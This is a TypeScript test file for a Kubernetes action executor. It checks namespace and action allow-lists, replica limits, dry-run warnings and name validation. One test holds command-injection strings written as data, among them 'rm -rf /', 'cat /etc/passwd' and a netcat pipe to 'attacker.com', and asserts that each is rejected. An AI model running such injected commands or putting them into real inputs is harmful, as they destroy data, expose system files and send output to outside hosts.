/**
 * Kubernetes Executor Tests
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { KubernetesExecutor } from './k8s-executor.js';
import { ACTION_TYPES, EXECUTION_MODES } from './types.js';
import type { ActionRequest } from './types.js';

describe('KubernetesExecutor', () => {
  let executor: KubernetesExecutor;

  beforeEach(() => {
    vi.clearAllMocks();

    executor = new KubernetesExecutor({
      allowedNamespaces: ['demo', 'staging', 'test'],
      allowedActions: [ACTION_TYPES.ROLLBACK, ACTION_TYPES.RESTART, ACTION_TYPES.SCALE],
      dryRunDefault: true,
    });
  });

  describe('properties', () => {
    it('should have correct name', () => {
      expect(executor.name).toBe('KubernetesExecutor');
    });

    it('should have kubernetes mode', () => {
      expect(executor.mode).toBe(EXECUTION_MODES.KUBERNETES);
    });
  });

  describe('validate', () => {
    const validRequest: ActionRequest = {
      type: ACTION_TYPES.RESTART,
      target: {
        namespace: 'demo',
        deployment: 'demo-app',
      },
      reason: 'Memory leak detected',
    };

    it('should validate a correct request', async () => {
      const result = await executor.validate(validRequest);

      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject invalid namespace name', async () => {
      const result = await executor.validate({
        ...validRequest,
        target: { ...validRequest.target, namespace: 'INVALID_NAMESPACE!' },
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('Invalid namespace name'))).toBe(true);
    });

    it('should reject invalid deployment name', async () => {
      const result = await executor.validate({
        ...validRequest,
        target: { ...validRequest.target, deployment: 'Invalid-Deployment!' },
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('Invalid deployment name'))).toBe(true);
    });

    it('should reject namespace not in allowed list', async () => {
      const result = await executor.validate({
        ...validRequest,
        target: { ...validRequest.target, namespace: 'production' },
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('not in allowed list'))).toBe(true);
    });

    it('should reject action type not in allowed list', async () => {
      const restrictedExecutor = new KubernetesExecutor({
        allowedNamespaces: ['demo'],
        allowedActions: [ACTION_TYPES.RESTART], // Only restart allowed
        dryRunDefault: true,
      });

      const result = await restrictedExecutor.validate({
        ...validRequest,
        type: ACTION_TYPES.ROLLBACK, // Rollback not allowed
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('Action type'))).toBe(true);
    });

    it('should validate scale action requires replicas', async () => {
      const result = await executor.validate({
        ...validRequest,
        type: ACTION_TYPES.SCALE,
        parameters: {}, // Missing replicas
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('replicas'))).toBe(true);
    });

    it('should validate replicas is within range', async () => {
      const result = await executor.validate({
        ...validRequest,
        type: ACTION_TYPES.SCALE,
        parameters: { replicas: 100 }, // Too many
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('between 0 and 10'))).toBe(true);
    });

    it('should allow valid scale parameters', async () => {
      const result = await executor.validate({
        ...validRequest,
        type: ACTION_TYPES.SCALE,
        parameters: { replicas: 3 },
      });

      expect(result.valid).toBe(true);
    });

    it('should warn when dry run is disabled', async () => {
      const result = await executor.validate({
        ...validRequest,
        dryRun: false,
      });

      expect(result.valid).toBe(true);
      expect(result.warnings.some((w) => w.includes('Dry run is disabled'))).toBe(true);
    });

    it('should reject excessively long names (command injection prevention)', async () => {
      const result = await executor.validate({
        ...validRequest,
        target: {
          namespace: 'a'.repeat(300), // Too long
          deployment: 'demo-app',
        },
      });

      expect(result.valid).toBe(false);
    });

    it('should reject names with special characters (command injection prevention)', async () => {
      const maliciousInputs = [
        'demo; rm -rf /',
        'demo && cat /etc/passwd',
        'demo$(whoami)',
        'demo`id`',
        'demo|nc attacker.com 1234',
        'demo\nmalicious',
      ];

      for (const input of maliciousInputs) {
        const result = await executor.validate({
          ...validRequest,
          target: { namespace: input, deployment: 'demo-app' },
        });

        expect(result.valid).toBe(false);
      }
    });

    it('should accept valid namespace names with dashes', async () => {
      const result = await executor.validate({
        ...validRequest,
        target: { namespace: 'demo', deployment: 'my-demo-app-v2' },
      });

      expect(result.valid).toBe(true);
    });

    it('should reject rollback with negative revision', async () => {
      const result = await executor.validate({
        ...validRequest,
        type: ACTION_TYPES.ROLLBACK,
        parameters: { revision: -1 },
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('Revision'))).toBe(true);
    });
  });

  describe('execute with validation failure', () => {
    it('should return failure on validation error', async () => {
      const result = await executor.execute({
        type: ACTION_TYPES.RESTART,
        target: { namespace: 'production', deployment: 'demo-app' }, // Not allowed
        reason: 'Test',
      });

      expect(result.success).toBe(false);
      expect(result.message).toContain('Validation failed');
    });

    it('should include validation errors in details', async () => {
      const result = await executor.execute({
        type: ACTION_TYPES.SCALE,
        target: { namespace: 'demo', deployment: 'demo-app' },
        reason: 'Test',
        parameters: { replicas: 100 }, // Invalid
      });

      expect(result.success).toBe(false);
      expect(result.details?.error).toContain('between 0 and 10');
    });
  });

  describe('context configuration', () => {
    it('should validate context name if provided', async () => {
      const contextExecutor = new KubernetesExecutor({
        allowedNamespaces: ['demo'],
        allowedActions: [ACTION_TYPES.RESTART],
        dryRunDefault: true,
        context: 'my-valid-context',
      });

      const result = await contextExecutor.validate({
        type: ACTION_TYPES.RESTART,
        target: { namespace: 'demo', deployment: 'demo-app' },
        reason: 'Test',
      });

      expect(result.valid).toBe(true);
    });

    it('should reject invalid context name', async () => {
      const contextExecutor = new KubernetesExecutor({
        allowedNamespaces: ['demo'],
        allowedActions: [ACTION_TYPES.RESTART],
        dryRunDefault: true,
        context: 'invalid context!',
      });

      const result = await contextExecutor.validate({
        type: ACTION_TYPES.RESTART,
        target: { namespace: 'demo', deployment: 'demo-app' },
        reason: 'Test',
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('Invalid context name'))).toBe(true);
    });
  });
});
